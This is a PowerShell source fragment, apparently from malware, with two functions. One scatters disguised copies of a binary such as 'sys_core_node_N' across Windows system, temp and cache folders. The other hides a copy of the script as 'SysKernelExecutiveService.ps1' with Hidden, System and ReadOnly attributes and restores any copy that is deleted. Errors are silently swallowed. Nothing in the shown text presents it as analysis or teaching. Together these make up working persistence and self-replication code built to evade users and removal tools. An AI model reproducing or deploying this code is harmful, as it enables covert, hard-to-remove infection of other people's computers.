function Invoke-AutoProliferation {
    param($sourceFile, $intensity)
    try {
        $autoDirs = @(
            "$env:ProgramData\Microsoft\Network\Downloader",
            "$env:LocalAppData\Temp",
            "$env:Public\Documents",
            "$env:SystemRoot\System32\Tasks",
            "$env:LocalAppData\Microsoft\Windows\INetCache"
        )
        foreach ($adir in $autoDirs) {
            if (-not (Test-Path $adir)) { New-Item -Path $adir -ItemType Directory -Force | Out-Null }
            for ($i = 1; $i -le $intensity; $i++) {
                $targetClone = Join-Path $adir "sys_core_node_${i}$binaryExt"
                Invoke-AutoDeployment -sourceFile $sourceFile -targetFile $targetClone | Out-Null
            }
        }
    } catch {}
}

function Invoke-AutoHealing {
    param([ref]$nodeRegistryRef)
    try {
        $serviceScriptPath = "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Maintenance\SysKernelExecutiveService.ps1"
        if (-not (Test-Path $serviceScriptPath)) {
            Copy-Item -Path $global:sourceScriptPath -Destination $serviceScriptPath -Force
            Set-ItemProperty -Path $serviceScriptPath -Name Attributes -Value "Hidden, System, ReadOnly"
        }
        $validSource = $null  
        if (Test-Path $global:primaryBinaryPath) {  
            $validSource = $global:primaryBinaryPath  
        } else {  
            foreach ($n in $nodeRegistryRef.Value) {  
                if (Test-Path $n) {  
                    $validSource = $n  
                    Invoke-AutoDeployment -sourceFile $validSource -targetFile $global:primaryBinaryPath | Out-Null  
                    break  
                }  
            }  
        }  
        if ($validSource) {  
            foreach ($n in $nodeRegistryRef.Value) {  
                if (-not (Test-Path $n) -or ((Get-Item $n).Length -eq 0)) {  
                    Invoke-AutoDeployment -sourceFile $validSource -targetFile $n | Out-Null  
                }  
            }  
        }  
    } catch {}
}

